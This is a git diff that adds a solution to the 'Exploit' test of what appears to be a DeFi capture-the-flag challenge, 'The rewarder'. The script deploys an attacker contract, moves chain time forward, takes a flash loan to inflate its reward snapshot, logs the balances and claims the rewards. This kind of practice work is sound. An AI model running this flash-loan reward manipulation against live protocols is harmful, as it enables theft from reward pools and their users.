@@ -66,6 +66,22 @@ describe('[Challenge] The rewarder', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        const TheRewarderPoolAttacker = await ethers.getContractFactory("TheRewarderPoolAttacker", attacker);
+        const theRewarderPoolAttacker = await TheRewarderPoolAttacker.deploy(this.liquidityToken.address, this.rewardToken.address, this.rewarderPool.address);
+
+        await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]);
+
+        await theRewarderPoolAttacker.connect(attacker).attackPool(this.flashLoanPool.address, TOKENS_IN_LENDER_POOL);
+
+        const currentSnapShotId = await this.rewarderPool.lastSnapshotIdForRewards();
+        console.log("current snap shot id: ", currentSnapShotId.toString());
+
+        const noobBalance = await this.accountingToken.balanceOfAt(alice.address, currentSnapShotId);
+        const cheatBalance = await this.accountingToken.balanceOfAt(theRewarderPoolAttacker.address, currentSnapShotId);
+        console.log("noob balance:  ", noobBalance.toString());
+        console.log("cheat balance: ", cheatBalance.toString()); 
+
+        await theRewarderPoolAttacker.connect(attacker).getFreeRewards();
     });
 
     after(async function () {
